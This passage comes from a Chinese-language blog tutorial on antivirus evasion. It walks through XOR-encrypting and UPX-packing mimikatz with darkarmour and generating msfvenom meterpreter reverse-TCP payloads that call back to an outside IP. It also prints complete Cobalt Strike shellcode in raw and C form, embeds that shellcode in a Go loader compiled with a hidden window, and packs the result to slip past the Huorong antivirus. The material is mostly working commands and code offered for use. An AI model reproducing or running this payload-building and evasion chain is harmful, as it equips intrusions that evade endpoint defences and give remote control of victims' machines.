KEY, --key KEY 用于加密的密钥，如果没有提供，则随机生成。提供</span><br><span class="line">-l LOOP, --loop LOOP 加密级别的数量,循环加密的次数</span><br><span class="line">-o OUTFILE, --outfile OUTFILE 输出文件的名称，如果没有提供，则随机分配文件名 会被分配到</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.sohu.com/a/167142473_604699#:~:text=XOR%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86%E6%98%AF%3A%E5%BD%93%E4%B8%80%E4%B8%AA%E6%95%B0A%E5%92%8C%E5%8F%A6%E4%B8%80%E4%B8%AA%E6%95%B0B%E8%BF%9B%E8%A1%8C%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97%E4%BC%9A%E7%94%9F%E6%88%90%E5%8F%A6%E4%B8%80%E4%B8%AA%E6%95%B0C%EF%BC%8C%E5%A6%82%E6%9E%9C%E5%86%8D%E5%B0%86C%E5%92%8CB%E8%BF%9B%E8%A1%8C%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97%E5%88%99C%E5%8F%88%E4%BC%9A%E8%BF%98%E5%8E%9F%E4%B8%BAA%E3%80%82,%E7%9B%B8%E5%AF%B9%E4%BA%8E%E5%85%B6%E4%BB%96%E7%9A%84%E7%AE%80%E6%98%93%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%EF%BC%8CXOR%E7%AE%97%E6%B3%95%E7%9A%84%E4%BC%98%E7%82%B9%E5%A6%82%E4%B8%8B%E3%80%82%20%281%29%E7%AE%97%E6%B3%95%E7%AE%80%E5%8D%95%EF%BC%8C%E5%AF%B9%E4%BA%8E%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E5%BE%88%E5%AE%B9%E6%98%93%E8%83%BD%E5%AE%9E%E7%8E%B0%E3%80%82">简易的加密算法——XOR 加密</a></p>
</blockquote>
<h2 id="实战免杀mimikatz"><a href="#实战免杀mimikatz" class="headerlink" title="实战免杀mimikatz"></a>实战免杀mimikatz</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python darkarmour.py -f mimikatz.exe -j -l 5 -e xor -o darkmeter.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#加壳</span><br><span class="line">upx darkmeter.exe</span><br><span class="line">#darkmeter.exe就是被包裹后的mimkatz，能过免杀，如果失败也不要气馁，免杀失败很正常，可以试一试将loop次数提高或者减少</span><br></pre></td></tr></table></figure>

<h2 id="实战MSF免杀"><a href="#实战MSF免杀" class="headerlink" title="实战MSF免杀"></a>实战MSF免杀</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.58.133 lport=4001 -f exe -o 4001.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.58.133 -P 4001</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python darkarmour.py -f 4001.exe -j -l 6 -e xor -o dark4001.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upx dark4001.exe</span><br></pre></td></tr></table></figure>

<h1 id="掩日-适用于红队的综合免杀工具"><a href="#掩日-适用于红队的综合免杀工具" class="headerlink" title="掩日 - 适用于红队的综合免杀工具"></a>掩日 - 适用于红队的综合免杀工具</h1><p>图形化工具</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/1y0n/AV_Evasion_Tool">AV_Evasion_Tool</a></p>
</blockquote>
<h1 id="免杀学习（强烈推荐）"><a href="#免杀学习（强烈推荐）" class="headerlink" title="免杀学习（强烈推荐）"></a>免杀学习（强烈推荐）</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/TideSec/BypassAntiVirus">https://github.com/TideSec/BypassAntiVirus</a></p>
</blockquote>
<p>把这些项目都做一遍~~无敌</p>
<h1 id="shellcode简介"><a href="#shellcode简介" class="headerlink" title="shellcode简介"></a>shellcode简介</h1><p>shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。</p>
<p>简单理解就是：shellcode是一段执行某些动作的机器码。</p>
<p>在计算机安全中，shellcode是一小段代码，可以用于软件漏洞利用的载荷。被称为“shellcode”是因为它通常启动一个命令终端，攻击者可以通过这个终端控制受害的计算机，但是所有执行类似任务的代码片段都可以称作shellcode。Shellcode通常是以机器码形式编写的，所以我们要学习硬编码。</p>
<p>需要注意到的是，shellcode可以在内存中直接执行某些操作，比如说让我们上线到cs，上线到msf，这些都是shellcode在内存中做的事</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/DeeLMind/p/6856133.html">ShellCode入门（提取ShellCode）</a></p>
</blockquote>
<h1 id="shellcode-launch"><a href="#shellcode-launch" class="headerlink" title="shellcode-launch"></a>shellcode-launch</h1><blockquote>
<p>加载shellcode的  </p>
</blockquote>
<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/jax777/shellcode-launch">https://github.com/jax777/shellcode-launch</a></p>
</blockquote>
<h2 id="安装GO环境"><a href="#安装GO环境" class="headerlink" title="安装GO环境"></a>安装GO环境</h2><blockquote>
<p>跨平台</p>
</blockquote>
<h3 id="Go-安装"><a href="#Go-安装" class="headerlink" title="Go 安装"></a>Go 安装</h3><blockquote>
<ul>
<li>GO  下载页面：<a target="_blank" rel="noopener" href="https://golang.google.cn/dl/">https://golang.google.cn/dl/</a></li>
<li>Go  安装的目录路径：D:\Program Files\Go</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#go env查看</span></span><br><span class="line">GOROOT=D:\Program Files\Go</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="Go-环境配置"><a href="#Go-环境配置" class="headerlink" title="Go 环境配置"></a>Go 环境配置</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看 Go 环境变量</span></span><br><span class="line">go env</span><br><span class="line"><span class="comment"># 设置 Go 环境变量</span></span><br><span class="line">go env <span class="literal">-w</span> GO111MODULE=auto</span><br></pre></td></tr></table></figure>

<h3 id="GOPATH"><a href="#GOPATH" class="headerlink" title="GOPATH"></a>GOPATH</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#setx命令：在用户或系统环境创建或修改环境变量。能基于参数、注册表项或文件输入设置变量。</span></span><br><span class="line"><span class="comment">#使用/M表示在系统写入，不/M表示写入用户变量</span></span><br><span class="line"><span class="comment">#格式： SETX [/S system [/U [domain\]user [/P [password]]]] var value [/M]</span></span><br><span class="line"><span class="comment">#主要是是var和value</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#代码编写位置（管理员权限）</span></span><br><span class="line">setx GOPATH <span class="string">&quot;F:\Learning\ComputerScience\Code\GO&quot;</span> /M</span><br><span class="line"><span class="comment">#若被拒绝：（不过这样仅仅是写入用户变量）</span></span><br><span class="line">setx GOPATH <span class="string">&quot;F:\Learning\ComputerScience\Code\GO&quot;</span></span><br><span class="line"><span class="comment">#添加到系统环境变量</span></span><br><span class="line">setx /M PATH <span class="string">&quot;<span class="variable">$Env:PATH</span>;F:\Learning\ComputerScience\Code\GO;D:\Program Files\Go\bin&quot;</span></span><br><span class="line"><span class="comment">#注意哦，使用setx一定要谨慎，</span></span><br><span class="line"><span class="comment">#如果是在环境变量后面追加值，一定不要忘记带上原变量，否则我们会覆盖掉原变量，而失去原变量。如果要追加在后面的话，一定要:</span></span><br><span class="line">setx /M PATH <span class="string">&quot;<span class="variable">$Env:PATH</span>;&lt;path to add&gt;&quot;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>注：若是出现截断的情况，建议手动添加环境变量</p>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209112048354.png" alt="image-20220911204822039"></p>
</blockquote>
<p>在 GOPATH  目录下新建三个文件夹</p>
<ul>
<li>src ：存放源码文件</li>
</ul>
<blockquote>
<ul>
<li>项目1</li>
</ul>
<blockquote>
<p>模块1<br>模块2</p>
</blockquote>
<ul>
<li>项目2</li>
</ul>
<blockquote>
<p>模块1<br>模块2</p>
</blockquote>
<ul>
<li>shellcode-launch</li>
</ul>
</blockquote>
<ul>
<li>bin ：存放编译后生成的二进制可执行文件</li>
<li>pkg ：存放编译后生成的归档文件（go module）</li>
</ul>
<h2 id="编译项目"><a href="#编译项目" class="headerlink" title="编译项目"></a>编译项目</h2><h3 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/jax777/shellcode<span class="literal">-launch</span>.git</span><br><span class="line"><span class="built_in">cd</span> shellcode<span class="literal">-launch</span></span><br></pre></td></tr></table></figure>

<h3 id="MSF或CS生成C的shellcode"><a href="#MSF或CS生成C的shellcode" class="headerlink" title="MSF或CS生成C的shellcode"></a>MSF或CS生成C的shellcode</h3><blockquote>
<p>我们如果需要借助shellcode-launch上线msf就要有一串上线msf的shellcode~，cs亦是同理</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#msf</span></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=124.223.217.243 lport=4567 -f c -o shellcode.c</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#cs</span><br><span class="line">attack -&gt; payload -&gt;</span><br><span class="line">payload选择c或者raw（原始的）</span><br><span class="line"></span><br><span class="line">#如：</span><br><span class="line">#raw：</span><br><span class="line">fc48 83e4 f0e8 c800 0000 4151 4150 5251</span><br><span class="line">5648 31d2 6548 8b52 6048 8b52 1848 8b52</span><br><span class="line">2048 8b72 5048 0fb7 4a4a 4d31 c948 31c0</span><br><span class="line">ac3c 617c 022c 2041 c1c9 0d41 01c1 e2ed</span><br><span class="line">5241 5148 8b52 208b 423c 4801 d066 8178</span><br><span class="line">180b 0275 728b 8088 0000 0048 85c0 7467</span><br><span class="line">4801 d050 8b48 1844 8b40 2049 01d0 e356</span><br><span class="line">48ff c941 8b34 8848 01d6 4d31 c948 31c0</span><br><span class="line">ac41 c1c9 0d41 01c1 38e0 75f1 4c03 4c24</span><br><span class="line">0845 39d1 75d8 5844 8b40 2449 01d0 6641</span><br><span class="line">8b0c 4844 8b40 1c49 01d0 418b 0488 4801</span><br><span class="line">d041 5841 585e 595a 4158 4159 415a 4883</span><br><span class="line">ec20 4152 ffe0 5841 595a 488b 12e9 4fff</span><br><span class="line">ffff 5d6a 0049 be77 696e 696e 6574 0041</span><br><span class="line">5649 89e6 4c89 f141 ba4c 7726 07ff d548</span><br><span class="line">31c9 4831 d24d 31c0 4d31 c941 5041 5041</span><br><span class="line">ba3a 5679 a7ff d5eb 735a 4889 c141 b861</span><br><span class="line">1e00 004d 31c9 4151 4151 6a03 4151 41ba</span><br><span class="line">5789 9fc6 ffd5 eb59 5b48 89c1 4831 d249</span><br><span class="line">89d8 4d31 c952 6800 0240 8452 5241 baeb</span><br><span class="line">552e 3bff d548 89c6 4883 c350 6a0a 5f48</span><br><span class="line">89f1 4889 da49 c7c0 ffff ffff 4d31 c952</span><br><span class="line">5241 ba2d 0618 7bff d585 c00f 859d 0100</span><br><span class="line">0048 ffcf 0f84 8c01 0000 ebd3 e9e4 0100</span><br><span class="line">00e8 a2ff ffff 2f51 7345 5400 354f 2150</span><br><span class="line">2540 4150 5b34 5c50 5a58 3534 2850 5e29</span><br><span class="line">3743 4329 377d 2445 4943 4152 2d53 5441</span><br><span class="line">4e44 4152 442d 414e 5449 5649 5255 532d</span><br><span class="line">5445 5354 2d46 494c 4521 2448 2b48 2a00</span><br><span class="line">354f 2150 2500 5573 6572 2d41 6765 6e74</span><br><span class="line">3a20 4d6f 7a69 6c6c 612f 352e 3020 2863</span><br><span class="line">6f6d 7061 7469 626c 653b 204d 5349 4520</span><br><span class="line">392e 303b 2057 696e 646f 7773 204e 5420</span><br><span class="line">362e 313b 2057 696e 3634 3b20 7836 343b</span><br><span class="line">2054 7269 6465 6e74 2f35 2e30 290d 0a00</span><br><span class="line">354f 2150 2540 4150 5b34 5c50 5a58 3534</span><br><span class="line">2850 5e29 3743 4329 377d 2445 4943 4152</span><br><span class="line">2d53 5441 4e44 4152 442d 414e 5449 5649</span><br><span class="line">5255 532d 5445 5354 2d46 494c 4521 2448</span><br><span class="line">2b48 2a00 354f 2150 2540 4150 5b34 5c50</span><br><span class="line">5a58 3534 2850 5e29 3743 4329 377d 2445</span><br><span class="line">4943 4152 2d53 5441 4e44 4152 442d 414e</span><br><span class="line">5449 5649 5255 532d 5445 5354 2d46 494c</span><br><span class="line">4521 2448 2b48 2a00 354f 2150 2540 4150</span><br><span class="line">5b34 5c50 5a58 3534 2850 5e29 3743 4329</span><br><span class="line">377d 2445 4943 4152 2d53 5441 4e44 4152</span><br><span class="line">442d 414e 5449 5649 5255 532d 5445 5354</span><br><span class="line">2d46 494c 4521 2448 2b48 2a00 354f 2150</span><br><span class="line">2540 4150 5b00 41be f0b5 a256 ffd5 4831</span><br><span class="line">c9ba 0000 4000 41b8 0010 0000 41b9 4000</span><br><span class="line">0000 41ba 58a4 53e5 ffd5 4893 5353 4889</span><br><span class="line">e748 89f1 4889 da41 b800 2000 0049 89f9</span><br><span class="line">41ba 1296 89e2 ffd5 4883 c420 85c0 74b6</span><br><span class="line">668b 0748 01c3 85c0 75d7 5858 5848 0500</span><br><span class="line">0000 0050 c3e8 9ffd ffff 3132 342e 3232</span><br><span class="line">332e 3231 372e 3234 3300 0000 0000 </span><br><span class="line"></span><br><span class="line">#c语言，在每个16进制前面加了\x，还原的话去掉\x，然后逐个转换为十进制即可~~~</span><br><span class="line">\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x61\x1e\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x4b\x57\x77\x44\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x34\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x38\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x35\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x34\x2e\x30\x3b\x20\x2e\x4e\x45\x54\x34\x2e\x30\x43\x3b\x20\x2e\x4e\x45\x54\x34\x2e\x30\x45\x29\x0d\x0a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x32\x34\x2e\x32\x32\x33\x2e\x32\x31\x37\x2e\x32\x34\x33\x00\x00\x00\x00\x00</span><br></pre></td></tr></table></figure>

<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209112203603.png" alt="image-20220911220316439" style="zoom:67%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209112206243.png" alt="image-20220911220630058" style="zoom:67%;" /></p>
<h3 id="修改winlaunch-go"><a href="#修改winlaunch-go" class="headerlink" title="修改winlaunch.go"></a>修改winlaunch.go</h3><blockquote>
<p>winlaunch.go和linuxlaunch.go文件就是加载shellcode的文件</p>
</blockquote>
<p>把生成的 shellcode 内容填入sc</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    sc := []<span class="type">byte</span>(<span class="string">&quot;shellcode填到这里&quot;</span>)</span><br><span class="line">    winshellcode.Run(sc)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;shellcode-launch/winshellcode&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	sc := []<span class="type">byte</span>(<span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x61\x1e\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x4b\x57\x77\x44\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x34\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x38\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x35\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x34\x2e\x30\x3b\x20\x2e\x4e\x45\x54\x34\x2e\x30\x43\x3b\x20\x2e\x4e\x45\x54\x34\x2e\x30\x45\x29\x0d\x0a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x32\x34\x2e\x32\x32\x33\x2e\x32\x31\x37\x2e\x32\x34\x33\x00\x00\x00\x00\x00&quot;</span>)</span><br><span class="line">	winshellcode.Run(sc)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="编译生成exe"><a href="#编译生成exe" class="headerlink" title="编译生成exe"></a>编译生成exe</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> CGO_ENABLED=<span class="number">0</span></span><br><span class="line"><span class="built_in">set</span> GOOS=windows</span><br><span class="line"><span class="built_in">set</span> GOARCH=amd64</span><br><span class="line">go build <span class="literal">-ldflags</span>=<span class="string">&quot;-s -w&quot;</span> <span class="literal">-o</span> shellcode<span class="literal">-launch-attack</span>.exe winlaunch.go</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#减少文件体积</span></span><br><span class="line">go build <span class="literal">-ldflags</span>=<span class="string">&quot;-s -w&quot;</span> <span class="literal">-o</span> <span class="number">1</span>.exe winlaunch.go</span><br><span class="line"><span class="comment">#减少文件体积+隐藏窗口</span></span><br><span class="line">go build <span class="literal">-ldflags</span>=<span class="string">&quot;-s -w -H=windowsgui&quot;</span> <span class="literal">-o</span> <span class="number">2</span>.exe winlaunch.go</span><br><span class="line"><span class="comment">#可选参数 -ldflags  是编译选项：</span></span><br><span class="line"><span class="comment"># -s -w  去掉调试信息，可以减小构建后文件体积，</span></span><br><span class="line"><span class="comment"># -H=windowsgui  隐藏文件执行窗口</span></span><br></pre></td></tr></table></figure>

<h3 id="过火绒"><a href="#过火绒" class="headerlink" title="过火绒"></a>过火绒</h3><p>随意加壳（亲测可用）：</p>
<blockquote>
<ul>
<li><p>upx壳，静态查杀可直接绕过,shellcode-launch目录下面带了upx.exe</p>
<blockquote>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/upx/upx/releases/">https://github.com/upx/upx/releases/</a></li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">.\upx64.exe .\shellcode<span class="literal">-launch-attack</span>.exe</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
<li><p>Themida ,图形化加壳程序，拖进去即可，然后protect开始加壳</p>
<blockquote>
<ul>
<li><a target="_blank" rel="noopener" href="https://down.52pojie.cn/Tools/Packers/Themida_x32_x64_v3.0.4.0_Repacked.rar">https://down.52pojie.cn/Tools/Packers/Themida_x32_x64_v3.0.4.0_Repacked.rar</a></li>
<li><a target="_blank" rel="noopener" href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1344654">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1344654</a></li>
</ul>
</blockquote>
